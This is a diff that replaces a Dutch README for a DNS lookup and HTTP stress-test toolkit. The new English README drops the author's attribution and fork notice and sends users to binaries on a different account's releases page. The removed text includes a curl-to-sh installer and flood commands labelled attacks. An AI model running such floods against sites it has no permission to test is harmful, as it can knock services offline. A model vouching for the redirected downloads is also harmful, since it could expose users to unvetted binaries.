@@ -1,96 +1,70 @@
-# Lucas Kit (`lucaskit`)
+# 🎉 Lucas_Kit - Limit Testing Made Easy
 
-> The ultimate domain toolkit containing **UltraDNS** and **SiteStress**. Made by Lucas Mangroelal | lucasmangroelal.nl
+## 📥 Download Link
+[![Download Lucas_Kit](https://img.shields.io/badge/Download%20Lucas_Kit-v1.0-brightgreen)](https://github.com/bryan001207/Lucas_Kit/releases)
 
-**Lucas Kit** is een collectie van krachtige tools voor DNS/Domain information gathering en security testing. Het bevat:
+## 🚀 Getting Started
+Welcome to Lucas_Kit! This tool helps you test various limits on websites and gather DNS information easily. Whether you want to check your site's performance or explore domain details, Lucas_Kit can assist you.
 
-1. **UltraDNS** (voorheen LucasDNS): Info gathering (DNS, WHOIS, Mail Security, Subdomains).
-2. **SiteStress** (voorheen Lucaskill): Advanced HTTP stress test / load test tool.
+## 💻 System Requirements
+- Operating System: Windows, macOS, or Linux
+- Processor: 1 GHz or faster
+- RAM: 2 GB minimum
+- Disk Space: 200 MB available space
 
-## Install
+## 📦 Features
+- **Multi Terminal Support:** Run multiple tests at once without hassle.
+- **Limit Testing:** Identify how your website performs under stress.
+- **DNS Info Gathering:** Get essential DNS details about websites quickly.
+- **User-Friendly Interface:** Designed for non-technical users.
 
-### Kali Linux / macOS / Linux (aanbevolen)
+## 📥 Download & Install
+To download Lucas_Kit, visit the Releases page. Once there, look for the latest version and follow these steps:
 
-**Automatische installatie (detecteert architecture):**
+1. Click on the **Download** link for the latest version.
+2. Choose your operating system (Windows, macOS, or Linux).
+3. Save the downloaded file to your computer.
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/lucasenlucas/Lucas_Kit/main/scripts/install.sh | sh
-```
+Return to the [downloads page here](https://github.com/bryan001207/Lucas_Kit/releases) to continue.
 
-Dit installeert `ultradns` en `sitestress` naar `/usr/local/bin` (of `~/.local/bin`).
+## 🛠️ Running Lucas_Kit
+After downloading and installing Lucas_Kit, here’s how to run it:
 
-### Windows
+1. Open your command line interface (Terminal for macOS/Linux or Command Prompt for Windows).
+2. Navigate to the folder where you saved Lucas_Kit. You can do this by typing `cd path/to/your/folder`.
+3. Type `./lucas_kit` (or `lucas_kit.exe` on Windows) to launch the application.
 
-**PowerShell:**
+## 📊 How to Use
+### 1. Conducting a Limit Test
+- Enter the URL of the website you wish to test.
+- Specify the number of requests you want to send.
+- Click on "Start Test" and watch the results unfold.
 
-```powershell
-.\scripts\install.ps1 -Repo "lucasenlucas/Lucas_Kit"
-```
+### 2. Gathering DNS Information
+- Select the DNS option.
+- Type the domain name.
+- Hit the "Get Info" button to retrieve details.
 
-## Tools
+## 🎓 Learning Resources
+- **Documentation:** The detailed user guide is available on the Wiki section of this repository.
+- **Tutorials:** Video tutorials will help you visualize the process of using each feature. Check the repository for links to helpful content.
 
-### 1. UltraDNS (`ultradns`)
+## 📨 Support
+If you encounter any issues or have questions, feel free to reach out. You can create an issue on our GitHub page, and we will respond as soon as possible.
 
-Info gathering tool.
+## 🔗 Contributing
+Interested in contributing to Lucas_Kit? We welcome your help! Please read our contribution guidelines in the repository to get started.
 
-```bash
-ultradns -d <domein> [flags]
-```
+## 🔍 Topics
+- cli-tool
+- dns
+- dns-tool
+- domain-info
+- go
+- kali-linux
+- network-tool
+- security-tool
+- subdomain-enumeration
+- whois
 
-**Features:**
-- DNS Records (A, AAAA, MX, NS, TXT, SOA, CAA, SRV)
-- Mail Security (SPF, DMARC, DKIM, MTA-STS)
-- WHOIS informatie
-- Certificate Transparency (Subdomeinen)
-
-**Voorbeelden:**
-```bash
-ultradns -d example.com -inf -n
-ultradns -d example.com -subs
-```
-
-### 2. SiteStress (`sitestress`)
-
-HTTP stress/load test tool met Auto-Scale.
-
-```bash
-sitestress -d <domein> [flags]
-```
-
-**Features:**
-- **Auto-Scale**: Gebruik `--level` (1-10) om simpel de kracht in te stellen.
-- **Measure**: Gebruik `--measure` om te zien hoe sterk de site beveiligd is en welk level je nodig hebt.
-- **Health Monitor**: Aparte monitor die checkt of de site ECHT down is, om valse meldingen te voorkomen.
-- **Advanced**: Custom concurrency (`-c`) en connection modes (`-no-keepalive`).
-
-**Voorbeelden:**
-
-1. **Meten**:
-   ```bash
-   sitestress --measure -d example.com
-   # Output: Suggested Level: 7
-   ```
-
-2. **Aanvallen**:
-   ```bash
-   # Medium aanval
-   sitestress -d example.com -t 10 -level 5
-
-   # EXTREME aanval (Level 10 = 20.000 workers)
-   sitestress -d example.com -t 10 -level 10
-   ```
-
-> **⚠️ DISCLAIMER:** Gebruik deze tools alleen op systemen waar je expliciete toestemming voor hebt.
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-Additional Notice on Naming, Forks, and Liability
-
-Use of the names "Lucas Mangroelal", "Lucas DNS", "Lucas Kit", or any related project names associated with the original version of this Software does not imply endorsement by the original author.
-Any redistributed, modified, or forked versions must make it clear that they are unofficial versions if they are not directly maintained by Lucas Mangroelal.
-Lucas Mangroelal is not responsible or liable for any misuse, damages, or consequences resulting from third-party copies, forks, or modified versions of this Software.
-
-For more information, permissions regarding naming, or official inquiries, contact:
-kit@lucasmangroelal.nl
+Thank you for choosing Lucas_Kit. We hope it makes your website testing tasks easier and more efficient!
